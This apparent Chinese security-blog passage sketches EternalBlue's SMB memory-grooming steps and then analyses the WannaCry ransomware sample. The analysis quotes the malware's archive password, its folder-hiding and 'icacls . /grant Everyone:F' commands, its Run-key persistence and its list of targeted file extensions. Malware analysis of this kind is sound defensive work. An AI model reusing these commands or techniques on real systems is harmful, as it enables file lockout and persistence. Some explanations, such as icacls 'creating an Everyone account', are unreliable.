title="漏洞利用2"></a>漏洞利用2</h4><p>永恒之蓝精细地构建了一系列连续的内存布局，这要求通过SMB协议远程稳定地申请并释放一段指定大小的pool内存，通过SMB_COM_SESSION_SETUP_ANDX命令实现。</p><p>该命令存在请求格式混淆的漏洞，在MS17-010补丁中未被修复，该漏洞可以使得服务端从错误的位置读取，创建一个指定大小的缓冲区，攻击者控制该缓冲区的连接断开后会形成一个大小可控的pool区域。</p><ul><li><p>分析永恒之蓝漏洞利用</p><ul><li><p>通过SMB_COM_TRANSACTION2命令触发内存越界写</p><p>在计算数据包中FEA_LIST长度时，会将单字拷贝到原双字数据中，攻击者可以借此伪造超长（大于等于0x10000）的FEA_LIST，在之后会使用错误长度进行memmove</p></li><li><p>构造长度大于FFFF的SMB_COM_TRANSACTION2命令</p><p>SMB_COM_TRANSACTION2命令数据包限长FFFF，而SMB_COM_NT_TRANSACT则可以发送大于FFFF的数据包。对于TRANSACTION指令，可以对指令进行拆分，后跟对应类型的_SECONDARY数据包，但实际上服务器端只会对最后一个 _SECONDARY包类型进行检查。</p><p>先发送SMB_COM_NT_TRANSACT数据包，后续发送一系列SMB_COM_TRANSACTION2_SECONDARY数据包，即可构造大于FFFF的SMB_COM_TRANSACTION2命令</p></li><li><p>构建内存布局，实现控制转移</p><p>控制转移通过修改SRVNET_BUFFER中MDL指针和指向SRVNET_RECV的指针实现，在断开所有连接后，会转移至servnet_recv结构指向的区域。</p><ul><li>申请多个SRVNET_BUFFER，可通过SMB 2协议产生，大小通过前4个字节控制</li><li>通过SMB_COM_SESSION_SETUP_ANDX命令的请求格式混淆漏洞，创建大小可控的pool内存区</li><li>继续申请SRVNET_BUFFER，确保与前者连续</li><li>断开第二步的连接，产生一个内存可控的内存空洞，后续紧跟一个SRVNET_BUFFER</li></ul></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Wannacry勒索病毒分析</title>
      <link href="2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
      <url>2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><strong>开始艰难的勒索软件分析生涯！</strong></p><a id="more"></a><p>可从该<a href="https://github.com/ytisf/theZoo">项目</a>中获取到Wannacry样本</p><p>参考报告：</p><p><a href="https://blog.csdn.net/qq_31507523/article/details/92418644">https://blog.csdn.net/qq_31507523/article/details/92418644</a></p><p><a href="https://www.freebuf.com/column/135722.html">https://www.freebuf.com/column/135722.html</a></p><h2 id="样本运行"><a href="#样本运行" class="headerlink" title="样本运行"></a>样本运行</h2><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329133101852.png" alt="image-20210329133101852" style="zoom:80%;"><p>样本文件夹</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329133146211.png" alt="image-20210329133146211" style="zoom:80%;"><ul><li>ed01…..exe：样本文件</li><li>taskdl.exe：删除临时目录和回收站下的所有后缀为<code>WNCRYT</code>”的文件</li><li>taskse.exe：</li><li>@WanaDecryptor：修改壁纸，定时弹出勒索窗口</li><li>00000000.eky：保存加密后的私钥</li><li>00000000.pky：保存公钥</li><li>00000000.res：保存时间信息</li><li>b.wnry：</li><li>c.wnry：保存比特币接收账户信息</li><li>r.wnry：一些勒索病毒作者留给受害者的说明信息</li><li>s.wnry：</li><li>t.wnry：保存主要恶意代码的加密文件</li><li>u.wnry：</li></ul><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="样本exe程序"><a href="#样本exe程序" class="headerlink" title="样本exe程序"></a>样本exe程序</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>进入IDA，main函数主要部分如下所示</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325135126646.png" alt="image-20210325135126646" style="zoom:80%;"><p>详细分析最终结果可参考如下</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326174059894.png" alt="image-20210326174059894"></p><p>其中重要步骤的分析可参考如下部分</p><h4 id="修改注册表项"><a href="#修改注册表项" class="headerlink" title="修改注册表项"></a>修改注册表项</h4><p>由原<code>sub_4010FD</code>函数实现，该函数结构为</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325135855022.png" alt="image-20210325135855022" style="zoom:80%;"><ul><li>拼接字符串Destination为“Software\WanaCrypt0r”</li><li>分别在HKCU和HKLM中创建<code>Software\WanaCrypt0r</code>表，并分别设置表项名为“wd”，值为当前目录全路径</li></ul><p>修改结果如下图所示</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329133742369.png" alt="image-20210329133742369" style="zoom:67%;"><h4 id="释放资源节到文件"><a href="#释放资源节到文件" class="headerlink" title="释放资源节到文件"></a>释放资源节到文件</h4><p>由原<code>sub_401DAB</code>函数实现，参数为Str（‘WNcry@2ol7’），该函数结构为</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325140947904.png" alt="image-20210325140947904" style="zoom:80%;"><ul><li><p>查找并载入资源节<code>XIA</code></p></li><li><p>调用函数<code>sub_4075AD</code>，使用到了参数Str，调用函数<code>sub_4075C4</code></p></li><li><p>以上两个函数都有些复杂，暂时不做进一步分析，先对资源节进行分析</p><p>用Resource Hacker查看该样本资源节</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325131946391.png" alt="image-20210325131946391"></p><p>该段二进制以PK开头，推测为zip压缩文件，提取出来试试看，确实是，还需要解压密码</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325132234721.png" alt="image-20210325132234721" style="zoom:67%;"><p>由于之前用到了参数Str，推测解压密码为‘WNcry@2ol7’</p><p>用该字符串解压成功，在解压目录下存在如下文件</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325133326123.png" alt="image-20210325133326123" style="zoom:67%;"><p>合理推测之前两个函数为解压资源节并解析文件的操作</p></li><li><p>循环遍历释放的文件，比较该文件名与Str2（’c.wnry’）的关系，如果不等，则调用函数<code>sub_40763D</code>，释放该压缩过后的文件</p></li></ul><h4 id="写入比特币账户信息"><a href="#写入比特币账户信息" class="headerlink" title="写入比特币账户信息"></a>写入比特币账户信息</h4><p>由原<code>sub_401E9E</code>函数实现，该函数结构为</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325143531454.png" alt="image-20210325143531454"></p><ul><li><p>对Source数组赋值</p></li><li><p>调用函数<code>sub_401000</code>，该函数结构比较清晰</p><ul><li>当第二个参数为1时，打开并读取文件<code>c.wnry</code></li><li>当第二个参数为0时，打开并写入文件<code>c.wnry</code></li></ul></li><li><p>因此可推测该函数会从以上三个字符串中随机选取一个写入到文件<code>c.wnry</code>中</p></li><li><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325150004411.png" alt="image-20210325150004411"></p><p>并且，将<code>c.wnry</code>中部分内容与勒索软件界面的比特币账户信息进行对比，可以看出是同一个，所以<code>c.wnry</code>文件中存储的是比特币账户信息</p></li></ul><h4 id="隐藏当前文件夹和创建账户"><a href="#隐藏当前文件夹和创建账户" class="headerlink" title="隐藏当前文件夹和创建账户"></a>隐藏当前文件夹和创建账户</h4><p>均由原<code>sub_401E9E</code>函数实现，传入的参数分别为</p><ul><li>lpCommandLine（’attrib +h .’）</li><li>aIcaclsGrantEve（’icacls . /grant Everyone:F /T /C /Q‘）</li></ul><p>该函数结构如下，作用是创建进程并执行命令</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325150718119.png" alt="image-20210325150718119"></p><ul><li><code>attrib +h .</code>作用是隐藏当前目录</li><li><code>icacls . /grant Everyone:F /T /C /Q</code>作用是创建账户Everyone，授予/T /C /Q权限</li></ul><h4 id="载入部分函数API"><a href="#载入部分函数API" class="headerlink" title="载入部分函数API"></a>载入部分函数API</h4><p>由原<code>sub_40170A</code>函数实现，该函数结构为</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325192019854.png" alt="image-20210325192019854" style="zoom:80%;"><ul><li>调用函数<code>sub_401A45</code>，该函数会从<code>advapi32.dll</code>载入一些Crypt开头的函数</li><li>从<code>kernel32.dll</code>中载入一些文件操作函数</li></ul><h4 id="初始化临界区"><a href="#初始化临界区" class="headerlink" title="初始化临界区"></a>初始化临界区</h4><p>由原<code>sub_4012FD</code>函数实现，该函数结构为</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325192710504.png" alt="image-20210325192710504" style="zoom:80%;"><ul><li>调用函数<code>sub_4017DD</code>，该函数会调用函数<code>InitializeCriticalSection</code></li></ul><p>总体来说，该函数会初始化临界区，方便多线程的访问</p><h4 id="导入密钥并分配全局堆内存"><a href="#导入密钥并分配全局堆内存" class="headerlink" title="导入密钥并分配全局堆内存"></a>导入密钥并分配全局堆内存</h4><p>由原<code>sub_401437</code>函数实现，该函数结构为</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325193305320.png" alt="image-20210325193305320"></p><ul><li>调用函数<code>sub_401861</code>，该函数会调用<code>CryptImportKey</code>函数导入密钥</li><li>两次调用<code>GlobalAlloc</code>，分配全局堆内存</li></ul><h4 id="解密数据"><a href="#解密数据" class="headerlink" title="解密数据"></a>解密数据</h4><p>由原<code>sub_4014A6</code>函数实现，重要参数为“t.wnry”，该函数部分结构为</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325194452415.png" alt="image-20210325194452415" style="zoom:67%;"><ul><li>前半部分会从文件<code>t.wnry</code>中读取数据到不同变量</li><li>后半部分会调用自定义函数进行处理，最后将处理后的数据保存在新分配的区域中，并返回该区域起始地址，推测该函数的作用为为解密<code>t.wnry</code>文件</li></ul><h4 id="加载DLL"><a href="#加载DLL" class="headerlink" title="加载DLL"></a>加载DLL</h4><p>由原<code>sub_4021BD</code>函数实现，该函数功能就是调用<code>sub_4021E9</code>函数，重要参数为此前获得的起始地址，该函数部分结构为</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210325200301166.png" alt="image-20210325200301166" style="zoom:80%;"><ul><li>一系列检查工作，比如<ul><li>调用函数<code>sub_402457</code>，判断解密的数据长度是否大于64</li><li>判断头两个字节是否为0x5A4D，即判断头部是否是MZ</li></ul></li></ul><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326150754064.png" alt="image-20210326150754064"></p><ul><li>载入函数<code>GetNativeSystemInfo</code></li></ul><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326151807231.png" alt="image-20210326151807231"></p><ul><li>间接调用函数<code>VirtualAlloc</code>，分配虚内存</li><li>调用函数<code>HeapAlloc</code>，在进程堆上分配空间</li></ul><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326153448991.png" alt="image-20210326153448991"></p><ul><li>该部分的代码看着有一些复杂，但其设置的变量v22会保存一些函数的地址，这些函数看起来与载入DLL密切相关，暂时结束静态分析</li></ul><p>综上，该部分会检查此前解密数据的结构是否为PE形式，并可能进行DLL载入工作，推测之前解密的数据为DLL文件，在该函数中进行载入。</p><p>下面尝试对该DLL文件进行提取，</p><ul><li>在虚拟机中用Ollydebug打开样本文件，于<code>00402132</code>处下一个断点，运行后，EAX寄存器内容即为解密数据的起始地址</li></ul><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326163249092.png" alt="image-20210326163249092"></p><ul><li><p>以下为该地址处对应的数据，可以看到明显是一个解密过后的数据，其中MZ和PE更确定是PE文件格式</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326163513527.png" alt="image-20210326163513527"></p></li><li><p>设断点于<code>0040213A</code>，截获解密后的数据长度为0x10000</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326165428529.png" alt="image-20210326165428529"></p></li><li><p>重新运行该函数，dump出解密后的数据，保存为<code>t.dll</code>，使用PEiD检查，发现确实是DLL文件</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326172626167.png" alt="image-20210326172626167"></p></li><li><p>检查该文件输出函数，发现一个<code>TaskStart</code></p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326172741044.png" alt="image-20210326172741044"></p></li></ul><p>之前猜想得以证明</p><h4 id="从DLL中导入函数TaskStart并执行"><a href="#从DLL中导入函数TaskStart并执行" class="headerlink" title="从DLL中导入函数TaskStart并执行"></a>从DLL中导入函数TaskStart并执行</h4><p>由由原<code>sub_4021BD</code>函数实现，该函数主要参数为之前获得的DLL在堆中的地址和字符串‘TaskStart’，内部结构如下</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210326173440743.png" alt="image-20210326173440743"></p><ul><li>该函数会在DLL数据内与字符串’TaskStart’进行比较</li><li>结合之前看到DLL的输出函数为TaskStart，合理推测该函数的作用是获取<code>TaskStart</code>函数的地址</li></ul><p>在这一函数结束后，会有以函数形式执行返回值的操作，合理推测为执行<code>TaskStart</code></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>恶意程序样本主要完成以下工作</p><ul><li>修改注册表项</li><li>将资源节中以zip形式压缩的文件释放，解压密码为‘WNcry@2ol7’</li><li>将比特币账户信息写入文件<code>c.wnry</code></li><li>将文件<code>t.wnry</code>解密后形成的DLL载入，执行其中的TaskStart函数</li></ul><h3 id="恶意DLL与TaskStart函数"><a href="#恶意DLL与TaskStart函数" class="headerlink" title="恶意DLL与TaskStart函数"></a>恶意DLL与TaskStart函数</h3><p>用IDA查看之前提取出的<code>t.dll</code>中的<code>TaskStart</code>函数，其主要部分如下所示</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327100712464.png" alt="image-20210327100712464" style="zoom:80%;"><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327100743585.png" alt="image-20210327100743585" style="zoom:80%;"><p>经过分析后可参考如下</p><p>下面开始逐步分析</p><h4 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h4><p>由原<code>sub_4021BD</code>函数实现，该函数结构如下</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327100937542.png" alt="image-20210327100937542"></p><ul><li>创建名为<code>MsWinZonesCacheCounterMutexA</code>的互斥体</li></ul><p>如果之前已经存在该互斥体，则程序结束，确保单一实例运行。</p><h4 id="读取c-wnry"><a href="#读取c-wnry" class="headerlink" title="读取c.wnry"></a>读取c.wnry</h4><p>由原<code>sub_10001000</code>函数实现，该函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327101922203.png" alt="image-20210327101922203" style="zoom:80%;"><ul><li>当参数a2=1时，会读取文件<code>c.wnry</code>到Buffer中</li></ul><h4 id="获取部分函数API"><a href="#获取部分函数API" class="headerlink" title="获取部分函数API"></a>获取部分函数API</h4><p>由原<code>sub_10003410</code>函数实现，该函数结构较简单，会载入<code>kernel32.dll</code>中的部分函数，主要和文件操作有关</p><h4 id="检查互斥体和文件"><a href="#检查互斥体和文件" class="headerlink" title="检查互斥体和文件"></a>检查互斥体和文件</h4><p>由原<code>sub_10003410</code>函数和<code>sub_10004500</code>函数实现</p><p>在函数<code>sub_10003410</code>函数中</p><ul><li>尝试打开互斥体<code>Global\MsWinZonesCacheCounterMutexW</code></li><li>没有则创建并检查互斥体<code>Global\MsWinZonesCacheCounterMutexA0</code>，并调用函数<code>sub_100013E0</code>设置属性</li></ul><p>在函数<code>sub_10004500</code>函数中</p><ul><li>检查是否存在文件<code>00000000.dky</code></li></ul><p>结合之后的分析可知，该互斥体是表示加密准备工作是否已完成的</p><h4 id="保存密钥"><a href="#保存密钥" class="headerlink" title="保存密钥"></a>保存密钥</h4><p>由原<code>sub_10003AC0</code>函数实现，该函数传入的两个重要参数分别为两个此前分别写入<code>00000000.pky</code>和<code>00000000.eky</code>的串，结构可参考如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327104944373.png" alt="image-20210327104944373" style="zoom:80%;"><ul><li>调用函数<code>sub_10003A80</code>，该函数会调用<code>CryptAcquireContextA</code>，获取加密所需密钥容器的csp的句柄</li><li>调用函数<code>sub_10003C00</code>，该函数会尝试打开文件<code>00000000.pky</code>并载入文件，从调用的函数来看与密钥有关，由于第一次使用时不存在该文件，返回值为0，会进入该选择段</li><li>调用函数<code>sub_10004350</code>，该函数会调用<code>CryptGenKey</code>，可以按照指定算法生成密钥，暂时没找到参数和算法的对应关系，但据其他报告说明是RSA。该密钥实际上包含公钥和私钥，下面称为pk和ek。</li><li>调用函数<code>sub_10004350</code>，该函数会创建文件<code>00000000.pky</code>并导出pk到该文件</li><li>调用函数<code>sub_10003C40</code>，该函数会将ek加密，然后存放在文件<code>00000000.eky</code></li></ul><p>分析完成后结构可参考如下</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210327130256949.png" alt="image-20210327130256949"></p><p>接下来会创建5个线程</p><h4 id="创建线程1：创建00000000-res文件"><a href="#创建线程1：创建00000000-res文件" class="headerlink" title="创建线程1：创建00000000.res文件"></a>创建线程1：创建00000000.res文件</h4><p>该线程会调用原函数<code>sub_10004790</code>，该函数结构如下</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328095316358.png" alt="image-20210328095316358"></p><ul><li>调用函数<code>time</code>记录当前时间</li><li>调用函数<code>sub_10004730</code>，该函数会创建文件<code>00000000.res</code>(文件名在<code>TaskStart</code>函数中赋值)并往其中写入数据</li><li>睡眠一段时间再循环</li></ul><h4 id="创建线程2：检查文件"><a href="#创建线程2：检查文件" class="headerlink" title="创建线程2：检查文件"></a>创建线程2：检查文件</h4><p>该线程会调用原函数<code>sub_100045C0</code>，该函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328100831958.png" alt="image-20210328100831958" style="zoom:80%;"><ul><li>检查dky文件是否存在</li><li>睡眠一段时间</li></ul><h4 id="创建线程3：检测磁盘并加密"><a href="#创建线程3：检测磁盘并加密" class="headerlink" title="创建线程3：检测磁盘并加密"></a>创建线程3：检测磁盘并加密</h4><p>该线程会调用原函数<code>sub_10005730</code>，该函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328101721963.png" alt="image-20210328101721963" style="zoom:80%;"><ul><li>调用函数<code>GetLogicalDrives</code>获取所有磁盘信息</li><li>在循环体中调用函数<code>GetLogicalDrives</code>，检测是否有新磁盘加入，如果有则创建新线程加密新磁盘，该线程会调用原函数<code>sub_10005680</code>，检查该函数</li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328103332749.png" alt="image-20210328103332749" style="zoom:80%;"><ul><li><p>调用函数<code>sub_10001590</code>，该函数会初始化临界区</p></li><li><p>调用函数<code>sub_10001830</code></p></li><li><p>调用函数<code>sub_10005540</code>，该函数可以获取某磁盘空余容量，并在判断磁盘类型为固定磁盘后。调用函数<code>sub_100027F0</code>对该磁盘下所有文件进行加密</p></li></ul><h4 id="创建线程4：启动taskdl-exe"><a href="#创建线程4：启动taskdl-exe" class="headerlink" title="创建线程4：启动taskdl.exe"></a>创建线程4：启动taskdl.exe</h4><p>该线程会调用原函数<code>sub_10005300</code>，该函数会循环调用函数<code>sub_10001080</code>，<code>sub_10001080</code>的重要参数为字符串’taskdl.exe’，其结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328104452000.png" alt="image-20210328104452000" style="zoom:80%;"><ul><li>该函数作用明显为启动<code>taskdl.exe</code>线程，注意其中StartupInfo结构中dwFlags值为1，表示隐藏窗口启动</li></ul><h4 id="创建线程5：启动taskse-exe和-WanaDecryptor-exe，安装注册表启动项"><a href="#创建线程5：启动taskse-exe和-WanaDecryptor-exe，安装注册表启动项" class="headerlink" title="创建线程5：启动taskse.exe和@WanaDecryptor@.exe，安装注册表启动项"></a>创建线程5：启动taskse.exe和@WanaDecryptor@.exe，安装注册表启动项</h4><p>该线程会调用原函数<code>sub_10004990</code>，该函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210328105114066.png" alt="image-20210328105114066" style="zoom:80%;"><ul><li>调用函数<code>Readcwnry</code>，注意此时第二个参数为0，表示写入数据</li><li>调用函数<code>sub_10004890</code>，该函数会启动<code>taskse.exe</code>和<code>@WanaDecryptor@.exe</code>，注意也是隐藏方式启动</li><li>获取<code>tasksche.exe</code>文件完整路径，保存到Buffer</li><li>调用函数<code>sub_100047F0</code>，该函数会调用cmd修改注册表<code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>项，安装tasksche.exe启动项</li></ul><p>启动项如下所示</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210329134040661.png" alt="image-20210329134040661" style="zoom:80%;"><h4 id><a href="#" class="headerlink" title></a></h4><h3 id="文件加密过程分析"><a href="#文件加密过程分析" class="headerlink" title="文件加密过程分析"></a>文件加密过程分析</h3><h4 id="加密函数1"><a href="#加密函数1" class="headerlink" title="加密函数1"></a>加密函数1</h4><p>由原函数<code>sub_100027F0</code>函数实现，该层加密函数主要起过渡作用，会调用<code>sub_10002300</code>函数和<code>sub_10002940</code>函数进行加密，结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404093355277.png" alt="image-20210404093355277" style="zoom:67%;"><h4 id="加密函数2"><a href="#加密函数2" class="headerlink" title="加密函数2"></a>加密函数2</h4><p>由原函数<code>sub_10002300</code>函数实现，该函数结构将分步分析</p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404130703678.png" alt="image-20210404130703678"></p><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404130723104.png" alt="image-20210404130723104"></p><ul><li>会循环查找目录下的文件，每个循环首先会判断其是否是当前目录或父目录文件，如果不是则继续</li><li>获取目标文件完整路径，保存到Buffer，判断该文件不是目录文件后继续</li><li>调用函数sub_100032C0，判断其是否是某些敏感文件，比如<code>ProgramData</code>目录下的文件，防止加密这些文件后影响系统</li><li>对于非敏感文件，判断其是否是病毒自带的三个资源文件，这是用来提示受害者的，如果不是则继续</li><li>调用函数sub_10002D60，该函数会对文件的后缀名做比较以选择是否要加密该文件，其结构如下</li></ul><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404131641809.png" alt="image-20210404131641809" style="zoom:67%;"><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404131716931.png" alt="image-20210404131716931" style="zoom:67%;"><ul><li>该函数首先过滤.exe和.dll文件，如果是则返回1</li><li>过滤.WNCRY文件，如果是则返回6</li><li>若文件后缀在以下字符串中，则返回2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.doc .docx .xls .xlsx .ppt .pptx .pst .ost .msg .eml .vsd .vsdx .txt .csv .rtf .123 .wks .wk1 .pdf .dwg .onetoc2 .snt .jpeg .jpg</span><br></pre></td></tr></table></figure><ul><li>若文件后缀在以下字符串中，则返回3</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.docb .docm .dot .dotm .dotx .xlsm .xlsb .xlw .xlt .xlm .xlc .xltx .xltm .pptm</span><br><span class="line">.pot .pps .ppsm .ppsx .ppam .potx .potm .edb .hwp .602 .sxi .sti .sldx .sldm .sldm .vdi .vmdk .vmx .gpg .aes .ARC .PAQ .bz2 .tbk .bak .tar .tgz .gz .7z .rar .zip .backup .iso .vcd .bmp .png .gif .raw .cgm .tif .tiff .nef .psd .ai .svg .djvu .m4u .m3u .mid .wma .flv .3g2 .mkv .3gp .mp4 .mov .avi .asf .mpeg .vob .mpg .wmv .fla .swf .wav .mp3 .sh .class .jar .java .rb .asp .php .jsp .brd .sch .dch .dip .pl .vb .vbs .ps1 .bat .cmd .js .asm .h .pas .cpp .c .cs .suo .sln .ldf .mdf .ibd .myi .myd .frm .odb .dbf .db .mdb .accdb .sql .sqlitedb .sqlite3 .asc .lay6 .lay .mml .sxm .otg .odg .uop .std .sxd .otp .odp .wb2 .slk .dif .stc .sxc .ots .ods .3dm .max .3ds .uot .stw .sxw .ott .odt .pem .p12 .csr .crt .key .pfx .der</span><br></pre></td></tr></table></figure><ul><li>若文件后缀为.WNCYR则返回5</li><li>若文件后缀为.WNCRYT则返回4</li><li>回到加密函数2，对于返回值为2，3，4，5的文件，调用函数<code>sub_10003760</code>将该文件路径和返回值类型保存到链表数据结构中，循环查询所有文件</li></ul><p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404133908035.png" alt="image-20210404133908035"></p><ul><li>对于路径保存到链表中的文件，根据其返回值调用函数<code>sub_10002940</code>进行加密，该函数为加密函数3，会在之后进行详细说明</li><li>此后会根据当前文件层数递归调用加密函数2，实现对所有目录项的遍历</li></ul><h4 id="加密函数3"><a href="#加密函数3" class="headerlink" title="加密函数3"></a>加密函数3</h4><p>由原函数<code>sub_10002940</code>函数实现，该函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404135053832.png" alt="image-20210404135053832" style="zoom:67%;"><ul><li><p>该函数首先调用函数<code>sub_10002E70</code>判断待加密文件类型决定策略</p><p>函数<code>sub_10002E70</code>的返回值可参考如下</p><ul><li>对于后缀为.WNCRYT，返回2</li><li>对于后缀为.WNCYR，返回1</li><li>对于之前判断为类型3的文件，比如后缀为.docx，返回4</li></ul></li><li><p>策略对应为</p><ul><li>2：删除文件</li><li>3：调用加密函数<code>sub_10002200</code>加密链表中所有文件</li><li>4：加密可能剩余链表中的文件</li></ul></li></ul><h4 id="加密函数4"><a href="#加密函数4" class="headerlink" title="加密函数4"></a>加密函数4</h4><p>由原函数<code>sub_10002940</code>函数实现，该函数结构如下</p><img src="/2021/03/23/wannacry%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20210404142530858.png" alt="image-20210404142530858" style="zoom:67%;"><ul><li>获取文件名字符串，在其后拼接.WNCRY</li><li>调用函数<code>sub_10001960</code>进行加密</li></ul><h4 id="加密函数5"><a href="#加密函数5" class="headerlink" title="加密函数5"></a>加密函数5</h4><p>由原函数<code>sub_10001960</code>函数实现，该函数结构比较复杂，会分步分析</p><img 